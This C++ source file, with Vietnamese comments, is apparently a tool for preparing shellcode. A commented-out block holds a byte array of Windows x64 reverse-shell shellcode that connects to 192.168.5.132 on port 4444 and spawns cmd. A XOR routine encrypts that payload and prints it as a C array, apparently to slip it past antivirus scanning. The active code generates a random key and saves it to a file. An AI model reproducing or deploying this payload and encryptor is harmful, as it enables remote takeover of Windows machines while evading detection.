#include <iostream>
#include <iomanip>
#include <string>
#include <windows.h>
#include <fstream>

//  TAO NGAU NHIEN KEY CHO HAM XOR
char *generateRandomString(int length);
//  HAM XOR
char *xorEncrypt(const char *data, int dataSize, const char *key, int keySize);
//  IN MANG RA
void printCharArray(const char *array, size_t size);
//  GHI FILE
bool writeCharArrayToFile(const std::string &fileName, const char *data, int size);

int main()
{
    /*const char hexPayload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x05\x84"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    const char *key = "k";
    const int keySize = strlen(key);

    std::cout << "---Encrypted payload---" << std::endl;
    char *encryptedPayload = xorEncrypt(hexPayload, sizeof(hexPayload), key, keySize);
    printCharArray(encryptedPayload, sizeof(hexPayload));
    std::cout << std::endl;*/

    const char *xorKey;
    xorKey = generateRandomString(16);
    const int keySize = strlen(xorKey);
    std::string output = "Generated_key.txt";

    if (writeCharArrayToFile(output, xorKey, keySize))
    {
        std::cout << "Key saved to file!" << std::endl;
    }
    else
    {
        std::cout << "Something went wrong!" << std::endl;
    }

    return 0;
}

char *generateRandomString(int length)
{
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";

    char *randomString = new char[length + 1];
    srand(time(0));
    for (int i = 0; i < length; ++i)
    {
        randomString[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    randomString[length] = '\0';
    return randomString;
}

char *xorEncrypt(const char *data, int dataSize, const char *key, int keySize)
{
    char *encryptedData = new char[dataSize];
    for (int i = 0; i < dataSize; ++i)
    {
        encryptedData[i] = data[i] ^ key[i % keySize];
    }
    return encryptedData;
}

void printCharArray(const char *array, size_t size)
{
    printf("const char encryptedHexPayload[] = {\n\t\"");
    for (size_t i = 0; i < size; ++i)
    {
        printf("\\x%02X", (unsigned char)array[i]);
        if (i != size - 1)
        {
            if ((i + 1) % 16 == 0)
            {
                printf("\"\n\t\"");
            }
            else
            {
                printf("");
            }
        }
    }
    printf("\"\n};\n");
}

bool writeCharArrayToFile(const std::string &fileName, const char *data, int size)
{
    // Open the file for writing
    std::ofstream outFile(fileName, std::ios::binary);

    if (!outFile)
    {
        std::cerr << "Failed to open output file." << std::endl;
        return false;
    }

    // Write the data to the file
    outFile.write(data, size);

    // Close the file
    outFile.close();
    return true;
}